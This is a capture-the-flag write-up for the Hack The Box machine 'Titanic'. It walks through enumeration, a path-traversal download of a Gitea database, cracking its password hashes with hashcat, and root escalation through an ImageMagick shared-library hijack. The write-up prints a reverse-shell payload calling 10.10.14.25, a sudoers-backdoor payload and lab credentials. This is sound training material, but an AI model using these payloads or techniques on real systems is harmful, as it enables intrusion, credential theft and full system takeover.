# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.55
nmap -sU --top-ports=10 -vv 10.10.11.55

---OUTPUT-TCP---
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

---OUTUT-UDP---
n/a
```

## Directory Enumeration
- Gobuster:
	- Directory
		```bash
gobuster dir -u http://titanic.htb dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
```
		- Next Directory
			```bash

```
	- VHost
		```bash

```
- Ffuf
	```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://titanic.htb/ -H 'Host: FUZZ.titanic.htb' -fw 20

---OUTPUT---
dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 46ms]
:: Progress: [100000/100000] :: Job [1/1] :: 1234 req/sec :: Duration: [0:01:36] :: Errors: 0 ::
```
- Dirsearch
	```bash

```
- Dirbuster
	- 

## Website Enumeration
- book now in main website where it feeds you a json file with the data you input
	- check for sqli
- dev.titanic.htb
	- Login Gitea
	- 2 repos
		- docker has sql pwd
			```bash
|`version: '3.8'`|
|`services:`|
|`mysql:`|
|`image: mysql:8.0`|
|`container_name: mysql`|
|`ports:`|
|`- "127.0.0.1:3306:3306"`|
|`environment:`|
|`MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'`|
|`MYSQL_DATABASE: tickets`|
|`MYSQL_USER: sql_svc`|
|`MYSQL_PASSWORD: sql_password`|
`restart: always`
```
		- flask app ticket has 2 users:
			```bash
`{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}`

`{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}`
```
	- app.py talks about how it's making the json file.
		- maybe we can poison it
	- docker-compose file:
		```bash
|`version: '3'`|
|`services:`|
|`gitea:`|
|`image: gitea/gitea`|
|`container_name: gitea`|
|`ports:`|
|`- "127.0.0.1:3000:3000"`|
|`- "127.0.0.1:2222:22" # Optional for SSH access`|
|`volumes:`|
|`- /home/developer/gitea/data:/data # Replace with your path`|
|`environment:`|
|`- USER_UID=1000`|
|`- USER_GID=1000`|
`restart: always`
```
		- Seems to be the dev login 
	- Can create account and login to find more users:
		![[Pasted image 20250425115131.png]]
	
### Direct
- 

### Via BurpSuite
- With burp i tried to see what was going on with the json file and found that We do a GET request to download a ticket.
	- If we replace the file with a path (for linux /etc/passwd) we get a hit:
	- ![[Pasted image 20250425124741.png]]
- https://docs.gitea.com/next/administration/config-cheat-sheet
	- Any changes to the Gitea configuration file should be made in `custom/conf/app.ini` or any corresponding location. When installing from a distribution, this will typically be found at `/etc/gitea/conf/app.ini`.
- So we try to access `/gitea/conf/app.ini`
	- ![[Pasted image 20250425150724.png]]
		- We see there is a database in `/data/gitea/gitea.db`
- We check for the DB:
	- ![[Pasted image 20250425150918.png]]
		- We see a DL and it says SQLite format
- We download this file via the url: http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db
- We use SQLite on it.
	```bash
sqlite3 _.._.._.._.._.._home_developer_gitea_data_gitea_gitea.db .tables
```
	- Gives us a lot of tables. We see one that says user:
	```bash
sqlite3 -cmd ".headers on" -cmd ".mode column" _.._.._.._.._.._home_developer_gitea_data_gitea_gitea.db "SELECT * FROM user;"

---OUTPUT---
id  lower_name     name           full_name  email                  keep_email_private  email_notifications_preference  passwd                                                        passwd_hash_algo  must_change_password  login_type  login_source  login_name  type  location  website  rands                             salt                              language  description  created_unix  updated_unix  last_login_unix  last_repo_visibility  max_repo_creation  is_active  is_admin  is_restricted  allow_git_hook  allow_import_local  allow_create_organization  prohibit_login  avatar                            avatar_email           use_custom_avatar  num_followers  num_following  num_stars  num_repos  num_teams  num_members  visibility  repo_admin_change_team_access  diff_view_style  theme       keep_activity_private
--  -------------  -------------  ---------  ---------------------  ------------------  ------------------------------  ------------------------------------------------------------  ----------------  --------------------  ----------  ------------  ----------  ----  --------  -------  --------------------------------  --------------------------------  --------  -----------  ------------  ------------  ---------------  --------------------  -----------------  ---------  --------  -------------  --------------  ------------------  -------------------------  --------------  --------------------------------  ---------------------  -----------------  -------------  -------------  ---------  ---------  ---------  -----------  ----------  -----------------------------  ---------------  ----------  ---------------------
1   administrator  administrator             root@titanic.htb       0                   enabled                         cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d4  pbkdf2$50000$50   0                     0           0                         0                        70a5bd0c1a5d23caa49030172cdcabdc  2d149e5fbd1b20cf31db3e3c6a28fc9b  en-US                  1722595379    1722597477    1722597477       0                     -1                 1          1         0              0               0                   1                          0               2e1e70639ac6b0eecbdab4a3d19e0f44  root@titanic.htb       0                  0              0              0          0          0          0            0           0                                               gitea-auto  0                    
                                                                                                                        59c08d2dfc063b2406ac9207c980c47c5d017136
```
	- Hard to read but we see some columns
		- passwd 
		- salt
		- name
		- email
- We grab the name, passwd and salt:
	```bash
sqlite3 _.._.._.._.._.._home_developer_gitea_data_gitea_gitea.db "select email,salt,passwd from user"

---OUTPUT---
root@titanic.htb|2d149e5fbd1b20cf31db3e3c6a28fc9b|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
developer@titanic.htb|8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
test@example.com|e12f9153749a76b86b697835b1980a5f|d07bd0a7bb0505e3a0fd0908d7f63ad11cd123b02c6ead8f98ed9f01303c5fc89d9a9453e3cb8d684c4002fff439e34abf8f
```
	- However this data is encrypted and not in a format for hashcat to read
- In an Ippsec video, we made a code regarding converting the db creds from sqlite into a hashcat format:
	```bash
import sqlite3
import base64
import sys

if len(sys.argv) != 2:
    print("Usage: python3 gitea3hashcat.py <gitea.db>")
    sys.exit(1)

try:
    con = sqlite3.connect(sys.argv[1])
    cursor = con.cursor()
    cursor.execute("SELECT name,passwd_hash_algo,salt,passwd FROM user")
    for row in cursor.fetchall():
        if "pbkdf2" in row[1]:
            algo, iterations, keylen = row[1].split("$")
            algo = "sha256"
            name = row[0]
        else:
            raise Exception("Unknown Algorithm")
        salt = bytes.fromhex(row[2])
        passwd = bytes.fromhex(row[3])
        salt_b64 = base64.b64encode(salt).decode("utf-8")
        passwd_b64 = base64.b64encode(passwd).decode("utf-8")
        print(f"{name}:{algo}:{iterations}:{salt_b64}:{passwd_b64}")
except Exception as e:
    print(f"Error: {e}")
    sys.exit(1)
```
- We use this code to get a hashcat readable hash to extract:
	```bash
python3 gitea2hashcat.py _.._.._.._.._.._home_developer_gitea_data_gitea_gitea.db         

---OUTPUT---
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
test:sha256:50000:4S+RU3SadrhraXg1sZgKXw==:0HvQp7sFBeOg/QkI1/Y60RzRI7Asbq2PmO2fATA8X8idmpRT48uNaExAAv/0OeNKv48=
```
	- We remove the name from the list and shave it start from sha256.
- We pass this to hashcat 
	```bash
hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt

---OUTPUT---
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:2528252
```
	- We see we get a hit for developer.
- We attempt to ssh with these credentials 
	```bash
ssh developer@titanic.htb
```
	- We gain access and grab the user flag
## Privilege Escalation
- Initial enumeration doesn't give much
	- we can't pass sudo commands
	- nothing too interesting in setuid files
- We check /opt/ and find some files:
	- in scripts there is a script:
		```bash
developer@titanic:/opt/scripts$ cat identify_images.sh                           


---OUTPUT---
cd /opt/app/static/assets/images                                                                       
truncate -s 0 metadata.log                                                                             
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```
	- looks like its using imagemagick to identify images to add to a log
- We check imagick version
	```bash
developer@titanic:/opt/scripts$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4
```
	- on searching the version on google we find this link:
		- https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
			- Basically says when imagick is executed if there are shared libraries in the current directory it will execute it with a test code:
				```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```
- We could use this to get a reverse shell by changing id to whatever code we want.
	- We could also just change our sudo permissions to be able to pass sudo and read the file
		- To get reverse shell:
			```bash
cd 
vi exploit.c
cat exploit.c
---OUTPUT---
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1'");
    exit(0);
}
```
		- We compile it:
			```bash
gcc exploit.c -shared -fPIC -o ./libxcb.so.1
```
	- We turn on netcat listener:
		```bash
nc -lvnp 9999

---OUTPUT---
nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.55] 37726
bash: cannot set terminal process group (229174): Inappropriate ioctl for device
bash: no job control in this shell
root@titanic:/opt/app/static/assets/images# whoami
whoami
root
root@titanic:/opt/app/static/assets/images# 
```
	- We can grab root flag
--------------
## Extras
- Found another code that simply changed current user to be able to pass sudo without password and have sudo privileges:
	```bash

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}

```
	- We can then do this command to read the root flag after a few minutes:
		```bash
sudo cat /root/root.txt
```
- Technically we can pass any command here to get the root flag. 
-------
--------